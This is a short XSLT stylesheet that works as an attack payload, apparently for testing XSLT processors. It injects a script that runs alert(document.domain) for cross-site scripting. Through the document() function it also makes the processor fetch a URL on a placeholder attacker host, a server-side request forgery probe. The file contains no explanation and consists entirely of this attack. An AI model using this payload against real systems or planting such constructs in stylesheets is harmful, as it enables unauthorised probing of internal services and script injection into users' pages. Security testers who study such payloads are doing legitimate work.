<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><script>alert(document.domain)</script><xsl:value-of select="document('http://ATTACKER-HOST/xslt-ssrf')"/></xsl:template></xsl:stylesheet>
